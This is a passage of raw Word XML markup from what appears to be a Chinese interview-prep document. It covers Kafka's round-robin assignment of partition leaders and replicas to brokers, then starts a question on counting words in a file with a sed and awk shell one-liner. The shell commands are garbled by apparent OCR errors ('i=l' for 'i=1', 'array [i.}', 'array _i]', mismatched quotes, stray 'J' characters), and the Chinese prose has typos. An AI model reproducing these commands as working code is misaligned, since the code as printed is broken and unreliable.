                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="31" name="Picutre 31"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId34"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5000625" cy="1743075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:after="279" w:line="1" w:lineRule="exact"/>
      </w:pPr>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>副本分配逻辑规则如下：</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>集群中，每个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>都有均等分配</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Partition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Leader</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>机会。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>上述图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Broker Partition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中，箭头指问为副本，以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Partition-。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>为例:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">broker </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">1中 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">parition-0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Leader, Broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">2 中 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Partition-0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>为副本。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>上述图种每个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Broker </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(按照</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Brokerld</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>有序)依次分配主</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Partition,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>下一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>为副 本，如此循环迭代分配，多副本都遵循此规则。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>副本分配算法如下：</w:t>
      </w:r>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>将所有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>N Broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和待分配的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Partition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>排序.</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>将第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Partition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分配到第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(i mod n)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>上.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>将第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Partition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>个副本分配到第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">((i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">+ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>j) mod n)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>上.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="83" w:name="bookmark89"/>
      <w:bookmarkStart w:id="84" w:name="bookmark90"/>
      <w:bookmarkStart w:id="85" w:name="bookmark91"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>15. shell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>脚本统计文件中单词的个数</w:t>
      </w:r>
      <w:bookmarkEnd w:id="83"/>
      <w:bookmarkEnd w:id="84"/>
      <w:bookmarkEnd w:id="85"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="970"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="120"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="86" w:name="bookmark92"/>
      <w:bookmarkEnd w:id="86"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">cat file|sed ' s/[,.:;/!?] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>/g‘ awk ' {for (i=l; i&lt;=NF; i++) array[$i] ++;} END {for (i in array) print i, array [i.}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>J</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，其中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>为要操作的文件，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>sed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中/ /间有一个空格。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1015"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="87" w:name="bookmark93"/>
      <w:bookmarkEnd w:id="87"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>sed ' s/[,. ：;/!?]/ /g‘ file|awk ' {for (i=l;i&lt;=NF;i++)array[$i] ++;}</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>END {for (i in array) print i, array _i] }</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>J</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t># (1)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(2)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>效果一致。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
